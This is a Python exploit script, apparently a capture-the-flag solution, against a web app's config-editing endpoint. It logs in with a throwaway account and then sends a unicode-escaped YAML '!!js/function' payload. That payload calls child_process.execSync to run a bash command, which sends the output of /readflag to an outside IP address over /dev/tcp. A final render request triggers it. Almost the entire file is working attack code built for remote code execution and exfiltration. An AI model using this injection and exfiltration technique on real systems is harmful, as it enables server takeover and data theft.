import requests
import os
import sys
from pwn import *

USERID = os.urandom(4).hex()
USERPW = os.urandom(4).hex()

HOST = "localhost"
PORT = 80
cookie = None
requests.post("http://"+ HOST + "/auth/register", json={
    "username": USERID, 
    "password": USERPW
})

res = requests.post("http://"+ HOST + "/auth/login", json={
    "username": USERID, 
    "password": USERPW
}, allow_redirects=False)
if (res.headers["Location"] == "/"):
    cookie = res.headers["Set-Cookie"]
else:
    print("fuck")
    sys.exit(1)


p = remote(HOST, PORT)


payload = """{"title":"chacha","highlightTheme":"\\ud800\\u000drevealOptions:\u0020{\\u0022toJSON\\u0022:\\u0020!!js/function \\u0022function \\u005cx28\\u005cx29 {global.process.mainModule.require\\u005cx28\\u005cx27child_process\\u005cx27\\u005cx29.execSync\\u005cx28\\u005cx60bash -c \\u005cx27/readflag\\u005cx3e/dev/tcp/43.200.33.70/1234\\u005cx27\\u005cx60\\u005cx29}\\u0022}","theme":"s"}"""

p.sendline(f"""POST /edit/add/config HTTP/1.1
Host: 43.200.33.70:1234
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: Close
Cookie: {cookie}
Content-Length: {len(payload)}
Content-Type: application/json

{payload}""".replace("\n","\r\n"))
if b"success" in p.recv():
    print("go")


requests.get("http://localhost/view/render",headers={"Cookie":cookie})